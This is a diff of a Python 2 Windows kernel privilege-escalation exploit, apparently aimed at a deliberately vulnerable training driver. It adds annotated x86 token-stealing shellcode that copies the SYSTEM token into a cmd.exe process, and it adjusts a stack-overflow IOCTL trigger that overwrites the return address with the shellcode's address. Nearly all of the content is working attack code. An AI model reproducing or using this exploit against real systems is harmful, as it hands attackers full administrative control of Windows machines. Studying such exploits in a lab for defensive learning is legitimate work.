@@ -89,29 +89,29 @@ def boomHeadshot():
 
 ### Stealing SYSTEM token ###
 def shellcode(pid):
-    print "Is this breaking?"
-    print "cmd.exe pid is: " + str(pid)
-    time.sleep(1)
     tokenstealing = (
-        "\x64\x8B\x15\x24\x01\x00\x00"
-        "\x8B\x42\x50"
-        "\x8B\x98\xB8\x00\x00\x00"
-        "\x8B\x0B"
-        "\xCC\x8B\x51\xF8"              # F8 for 8 bytes FC for 4 bytes
-        "\x83\xFA\x04"
-        "\x74\x04"
-        "\x8B\x09"
-        "\xEB\xF3"
-        "\xCC\x8B\x81\x80\x00\x00\x00"
-        "\x24\xF0"
-        "\x8B\x52\xF8"
-        "\x81\xFA" + struct.pack("<I",pid) +
-        "\x74\x04"
-        "\x8B\x09"
-        "\xEB\xF1"
-        "\x89\x81\x80\x00\x00\x00"
-        "\x83\xC4\x28"
-        "\xC3")
+        "\x60"                              # PUSHAD
+        "\x64\x8B\x15\x24\x01\x00\x00"      # MOV EAX, FS:124       ; Kthread offset
+        "\x8B\x42\x50"                      # MOV EAX, [EAX+0x50]   ; Eprocess offset
+        "\x50"                              # PUSH EAX              ; Push Eprocess offset to stack to use later
+        "\xBB\x04\x00\x00\x00"              # MOV EBX, 4            ; SYSTEM pid
+        "\x8B\x80\xB8\x00\x00\x00"          # MOV EAX, [EAX+0xB8]   ; Next flink in ActiveProcessLink (Loop begin)
+        "\x2D\xB8\x00\x00\x00"              # SUB EAX, 0xB8         ; Move that ass to the next link
+        "\x39\x98\xB4\x00\x00\x00"          # CMP [EAX+0xB4], EBX   ; CMP UniqueProcessID to EBX (SYSTEM PID 4)
+        "\x75\xED"                          # JNZ up                ; If not PID 4 then jump to loop start
+        "\x8B\xB8\xF8\x00\x00\x00"          # MOV EDI, [EAX+0xF8]   ; Move TOKEN value of SYSTEM process to EDI
+        "\x83\xE7\xF8"                      # AND EDI, FFFFFFFF8    ; Token value must be aligned by 8
+        "\x58"                              # POP EAX               ; Pop Eprocess offset
+        "\xBB" + struct.pack("<I", pid) +   # MOV EBX, cmdPID       ; Move the PID of cmd.exe to ebx
+        "\x8B\x80\xB8\x00\x00\x00"          # MOV EAX, [EAX+0xB8]   ; Next flink in ActiveProcessLink (Loop begin)
+        "\x2D\xB8\x00\x00\x00"              # SUB EAX, 0xB8         ; Move that ass to the next link
+        "\x39\x98\xB4\x00\x00\x00"          # CMP [EAX+0xB4], EBX   ; CMP UniqueProcessID to EBX (cmd.exe PID)
+        "\x75\xED"                          # JNZ up                ; If not cmd.exe PID then jump to loop start
+        "\x89\xB8\xF8\x00\x00\x00"          # MOV [EAX+0xF8], EDI   ; Copy SYSTEM TOKEN to overwrite cmd.exe TOKEN
+        "\x61"                              # POPAD
+        "\x31\xC0"                          # XOR EAX, EAX          ; Simulate driver IOCTL success epilogue
+        "\x5D"                              # POP EBP
+        "\xC2\x08\x00")                     # RETN 8
 
     print "[*]Allocating buffer for shellcode[*]"
     lpAddress = None
@@ -129,8 +129,6 @@ def shellcode(pid):
         sys.exit(-1)
 
     print "\t[+]Shellcode buffer allocated at 0x%x" % allocateShell
-
-    ### Actual Alloc ###
     memmove(allocateShell, tokenstealing, len(tokenstealing))
     return allocateShell
 
@@ -169,10 +167,10 @@ def ctl_code(function,
 ### Create buffer and send IOCRL ###
 def trigger(hDevice, dwIoControlCode, scAllocateShell):
 
-    shellz = create_string_buffer("A"*2092 + struct.pack("<L", scAllocateShell))
-    print "[*]Triggering vulnerable IOCTL..."
+    shellz = create_string_buffer("A"*2092 + "B"*4 + struct.pack("<L", scAllocateShell))
+    print "[*]Triggering vulnerable IOCTL...[*]"
     lpInBuffer = addressof(shellz)
-    nInBufferSize = len(shellz)-1
+    nInBufferSize = len(shellz)
     lpOutBuffer = None
     nOutBufferSize = 0
     lpBytesReturned = byref(c_ulong())
